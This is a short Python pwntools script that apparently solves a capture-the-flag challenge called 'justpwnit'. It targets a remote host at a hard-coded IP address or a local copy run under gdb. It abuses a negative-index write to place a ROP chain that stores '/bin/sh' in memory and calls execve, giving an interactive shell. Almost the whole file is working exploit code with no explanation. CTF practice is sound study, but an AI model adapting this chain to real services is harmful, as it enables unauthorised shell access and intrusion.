from pwn import *
import sys

if sys.argv[1] == "r":
    p = remote("168.119.108.148", 11010)
elif sys.argv[1] == "l":
    p = process("./justpwnit")
    context.terminal = ["tmux", "splitw", "-h"]
    gdb.attach(p, """ 
                    break *0x40120C
                    continue
                    """)

pop_rsi = 0x4019a3
pop_rdi = 0x401b0d
pop_rax = 0x401001
pop_rdx = 0x403d23
syscall = 0x4013e9
bss = 0x40C280
magic = 0x406c3d # mov qword ptr [rdi], rsi ; ret
def solve():
    rop_chain = p64(pop_rdi)
    rop_chain += p64(pop_rdi)
    rop_chain += p64(bss)
    rop_chain += p64(pop_rsi)
    rop_chain += "/bin/sh\x00"
    rop_chain += p64(magic)
    rop_chain += p64(pop_rax)
    rop_chain += p64(0x3b)
    rop_chain += p64(pop_rdi)
    rop_chain += p64(bss)
    rop_chain += p64(pop_rsi)
    rop_chain += p64(0)
    rop_chain += p64(pop_rdx)
    rop_chain += p64(0)
    rop_chain += p64(syscall)
    p.sendlineafter("Index: ", str(-2))
    p.sendlineafter("Data: ", rop_chain)
    p.interactive()

if __name__ == "__main__":
    solve()